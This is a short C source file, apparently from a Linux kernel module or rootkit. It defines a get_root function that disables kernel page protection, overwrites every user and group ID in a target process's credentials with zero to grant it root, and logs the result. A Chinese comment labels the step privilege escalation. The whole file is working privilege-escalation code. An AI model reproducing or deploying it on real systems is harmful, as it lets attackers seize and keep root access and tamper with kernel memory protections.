#include "getroot.h"

void get_root(int pid)
{
    struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);

    struct cred *pcred = (struct cred *)task->cred;

    disable_page_protection();
    rcu_read_lock();

    // 提权
    pcred->uid.val = pcred->euid.val = 0;
    pcred->suid.val = pcred->fsuid.val = 0;
    pcred->gid.val = pcred->egid.val = 0;
    pcred->sgid.val = pcred->fsgid.val = 0;

    rcu_read_unlock();
    enable_page_protection();

    pr_info("%d get root", pid);
}
